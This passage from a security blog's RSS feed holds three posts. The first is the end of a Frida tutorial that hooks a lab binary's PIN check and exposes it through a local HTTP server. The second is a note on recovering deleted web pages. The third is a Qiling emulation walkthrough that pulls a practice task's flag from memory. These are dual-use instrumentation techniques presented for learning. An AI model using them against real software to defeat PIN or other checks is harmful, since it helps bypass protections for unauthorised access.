    &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ptr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1337&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;printf(&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;format=&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;readUtf8String&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;);
  },
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;examples&#34;&gt;Examples&lt;/h2&gt;
&lt;h3 id=&#34;spawn-web-server&#34;&gt;Spawn web server&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt; } &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./logger&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);

&lt;span style=&#34;color:#a6e22e&#34;&gt;rpc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;allocUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);
    },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;httpServer&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createServer&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);

            &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Request to check &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; returned &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;check&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);

            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;check&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeHead&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;});
                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Welcome!&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n`&lt;/span&gt;);
            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeHead&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;401&lt;/span&gt;, {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;});
                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Wrong PIN&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n`&lt;/span&gt;);
            }

            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;end&lt;/span&gt;();
        }).&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;frida-agent-example/_agent.js&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    agent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; frida&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;crypt&amp;#34;&lt;/span&gt;)
script &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_script(agent)
script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load()

api &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exports
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;starting HTTP server...&amp;#34;&lt;/span&gt;)
api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;http_server()

&lt;span style=&#34;color:#75715e&#34;&gt;# keep the server alive now&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;npm run build &lt;span style=&#34;color:#75715e&#34;&gt;# or watch&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://frida.re&#34;&gt;https://frida.re&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/leonjza/frida-boot&#34;&gt;https://github.com/leonjza/frida-boot&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
    <item>
      <title>Nothing Is Lost in the Internet</title>
      <link>/posts/nothing-is-lost-in-the-internet/</link>
      <pubDate>Sun, 14 Jun 2020 09:42:17 +0200</pubDate>
      
      <guid>/posts/nothing-is-lost-in-the-internet/</guid>
      <description>&lt;p&gt;It  is very easy to upload something to the Internet, but hard to delete. This is short story about searching for &amp;ldquo;deleted&amp;rdquo; resources in the Internet.&lt;/p&gt;</description>
      <content>&lt;p&gt;It  is very easy to upload something to the Internet, but hard to delete. This is short story about searching for &amp;ldquo;deleted&amp;rdquo; resources in the Internet.&lt;/p&gt;
&lt;h2 id=&#34;problem&#34;&gt;Problem&lt;/h2&gt;
&lt;p&gt;These methods may help you if want to access some Internet resource (like document or page), but it is no longer available because website is down or author decided to remove it.&lt;/p&gt;
&lt;h2 id=&#34;finding-removed-things&#34;&gt;Finding &amp;ldquo;removed&amp;rdquo; things&lt;/h2&gt;
&lt;h3 id=&#34;website-mirrors&#34;&gt;Website mirrors&lt;/h3&gt;
&lt;p&gt;If you know where this resource is placed (you know it&amp;rsquo;s url) the easiest method is to go to &lt;a href=&#34;https://archive.org/web/&#34;&gt;Web Archive&lt;/a&gt;, type your url and select a mirror from the timeline.&lt;/p&gt;
&lt;h3 id=&#34;google-cache&#34;&gt;Google cache&lt;/h3&gt;
&lt;p&gt;Of course not all Internet resources are mirrored, so it may happen that web archive doesn&amp;rsquo;t have saved url interesting for you. If your resource was deleted recently you can always search for it&amp;rsquo;s search browser &lt;em&gt;cached&lt;/em&gt; version, for google you need to type in search field:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;cache:&amp;lt;url&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can also use other search browser to achieve similar results.&lt;/p&gt;
&lt;h3 id=&#34;hunting-for-deleted-things&#34;&gt;Hunting for deleted things&lt;/h3&gt;
&lt;p&gt;Finally if you don&amp;rsquo;t know your resource url you can also use other search browser than google, like &lt;a href=&#34;https://duckduckgo.com/&#34;&gt;DuckDuckGo&lt;/a&gt;. It may be useful, because google is removing dead url pretty quickly (it is also intentionally hiding some websites), so it is always good to use other search browsers.&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Qiling Scripting and Simple RE Task</title>
      <link>/posts/qiling-scripting-and-simple-re-task/</link>
      <pubDate>Thu, 21 May 2020 14:53:08 +0200</pubDate>
      
      <guid>/posts/qiling-scripting-and-simple-re-task/</guid>
      <description>Note about qiling and basic usage</description>
      <content>&lt;h2 id=&#34;what-is-qiling&#34;&gt;What is Qiling&lt;/h2&gt;
&lt;p&gt;From the author&amp;rsquo;s website:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Qiling is an advanced binary emulation framework, with the following features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cross platform: Windows, MacOS, Linux, BSD&lt;/li&gt;
&lt;li&gt;Cross architecture: X86, X86_64, Arm, Arm64, Mips&lt;/li&gt;
&lt;li&gt;Multiple file formats: PE, MachO, ELF&lt;/li&gt;
&lt;li&gt;Emulate &amp;amp; sandbox machine code in a isolated environment&lt;/li&gt;
&lt;li&gt;Supports cross architecture and platform debugging capabilities&lt;/li&gt;
&lt;li&gt;Provide high level API to setup &amp;amp; configure the sandbox&lt;/li&gt;
&lt;li&gt;Fine-grain instrumentation: allow hooks at various levels (instruction/basic-block/memory-access/exception/syscall/IO/etc)&lt;/li&gt;
&lt;li&gt;Allow dynamic hotpatch on-the-fly running code, including the loaded library&lt;/li&gt;
&lt;li&gt;True framework in Python, making it easy to build customized security analysis tools on top&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Qiling is backed by &lt;a href=&#34;http://www.unicorn-engine.org&#34;&gt;Unicorn engine&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Or just saying shortly: this tool will allow you to run binary from one system to another, i.e you can run Windows PE on Mac.&lt;/p&gt;
&lt;p&gt;Additionally you can also utilize its scripting ability to hook addresses, run only part of binary, etc. Check the &lt;a href=&#34;#references&#34;&gt;references&lt;/a&gt; to view project&amp;rsquo;s GitHub page and others.&lt;/p&gt;
&lt;h2 id=&#34;simple-demo&#34;&gt;Simple demo&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s imagine that we have this simple task:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/task-code.png&#34; alt=&#34;Task&#34;&gt;&lt;/p&gt;
&lt;p&gt;Obviously flag is generated from the stack strings with some on-the-fly operations, we can very easly capture the flag by setting couple of breakpoints in the debugger at addresses: &lt;code&gt;0x804852e&lt;/code&gt; and &lt;code&gt;0x804853d&lt;/code&gt; and check the contents of &lt;em&gt;eax&lt;/em&gt; (notice that second part of the flag actually replaces the 1st part) or we can write simple script using Qiling:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; environ

EXEC_FILE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./task&amp;#34;&lt;/span&gt;]
ROOTFS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/x86_linux&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(environ[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;QILING_ROOTFS&amp;#34;&lt;/span&gt;])
FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on_hook&lt;/span&gt;(ql : core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Qiling) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
    addr_flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax
    FLAG&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(addr_flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;my_sandbox&lt;/span&gt;(path, rootfs):
    ql &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Qiling(path, rootfs)
    
    &lt;span style=&#34;color:#75715e&#34;&gt;# remove systrace logs&lt;/span&gt;
    ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

    ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804852e&lt;/span&gt;)
    ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804853d&lt;/span&gt;)
    ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()

    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
    print(flag)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    my_sandbox(EXEC_FILE, ROOTFS)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some explanation: Qiling for execution requires 2 things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;binary - what is obvious;&lt;/li&gt;
&lt;li&gt;Rootfs - which should match target architecture.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In my case environment variable &lt;code&gt;$QILING_ROOTFS&lt;/code&gt; points to &lt;code&gt;$QILING_REPO_DIR/examples/rootfs&lt;/code&gt;, above mentioned is a linux x86 binary so we are selecting &lt;code&gt;x86_linux&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; environ

EXEC_FILE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./task&amp;#34;&lt;/span&gt;]
ROOTFS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/x86_linux&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(environ[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;QILING_ROOTFS&amp;#34;&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We want to &lt;del&gt;break&lt;/del&gt; hook at specified addresses, so we can achieve that by calling &lt;code&gt;hook_address(callback, address)&lt;/code&gt; I decided to reuse twice the same function, but you can create separate functions for that:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804852e&lt;/span&gt;)
ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804853d&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After everything is setup we can run the binary with &lt;code&gt;ql.run()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Our hook method reads the value from &lt;em&gt;eax&lt;/em&gt; register and saves it in global variable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on_hook&lt;/span&gt;(ql : core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Qiling) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
    addr_flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax
    FLAG&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(addr_flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice that we are reading twice the same amount of bytes (&lt;code&gt;ql.mem.read(addr_flag, 0x13)&lt;/code&gt;), so we need to truncate these array before printing it on the screen:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
    print(flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By default Qiling displays &lt;code&gt;strace&lt;/code&gt; log, if you don&amp;rsquo;t want to see it or you want to see only logs from specific methods you can use filters (you need to change this variable before running the qiling):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# mute strace log&lt;/span&gt;
ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# display only &amp;#34;read&amp;#34; functions&lt;/span&gt;
